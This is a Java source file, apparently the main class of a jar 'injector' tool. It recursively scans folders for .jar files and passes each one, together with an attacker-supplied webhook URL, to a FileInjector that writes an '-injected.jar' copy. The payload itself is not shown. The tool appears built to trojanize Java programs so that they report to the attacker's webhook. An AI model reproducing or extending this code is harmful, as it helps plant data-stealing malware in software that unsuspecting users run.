package lol.nikko.ectasyinjector;

import lol.nikko.ectasyinjector.inject.FileInjector;
import lol.nikko.ectasyinjector.logging.Logger;

import java.io.File;
import java.util.List;

public class Injector {
    private final boolean debug;
    private final String webhook;
    private final List<File> files;

    private final Logger logger;

    public Injector(boolean debug, String webhook, List<File> files) {
        this.debug = debug;
        this.webhook = webhook;
        this.files = files;

        this.logger = new Logger(debug);
    }

    public void inject() {
        logger.info("Starting injection process...");

        for (File f : files) {
            try {
                this.handleFile(f);
            } catch (Throwable throwable) {
                logger.error("Caught an exception trying to inject file " + f.getPath());
                logger.debug(throwable.getMessage());
            }
        }

        logger.info("Finished injection process!");
    }

    private void handleFile(File file) throws Throwable {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null)
                return;

            for (File f : files)
                this.handleFile(f);

            return;
        }

        if (!file.getName().endsWith(".jar")) {
            logger.warn("File " + file.getPath() + " is not a jar file!");
            return;
        }

        FileInjector fileInjector = new FileInjector(this, file, new File(file.getAbsolutePath().replace(".jar", "-injected.jar")));
        if (fileInjector.inject(webhook, debug)) {
            logger.info("Successfully injected file " + file.getPath() + "!");
            return;
        }

        logger.error("Failed to inject file " + file.getPath() + "!");
    }

    public Logger getLogger() {
        return logger;
    }
}
